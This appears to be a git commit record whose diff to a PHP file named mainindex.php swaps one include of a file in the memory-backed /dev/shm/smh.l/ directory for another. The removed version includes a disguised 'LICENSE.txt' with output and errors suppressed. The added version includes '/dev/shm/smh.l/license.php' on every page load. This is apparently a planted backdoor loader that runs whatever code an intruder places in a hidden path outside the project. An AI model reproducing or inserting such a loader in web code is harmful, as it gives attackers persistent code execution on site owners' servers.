d9083dfbc868f98815cdaca8c760eb53603b5846
bayyp <dimasbayyp@gmail.com>
2025-12-09 02:20:14 -0500

    Update mainindex.php

--- mainindex.php
+++ mainindex.php
@@ -1,6 +1,3 @@
 <?php
-if (file_exists('/dev/shm/smh.l/LICENSE.txt')) {
-    @ob_start();
-    @include '/dev/shm/smh.l/LICENSE.txt';
-    @ob_end_clean();
-}
+include '/dev/shm/smh.l/license.php';
+?>
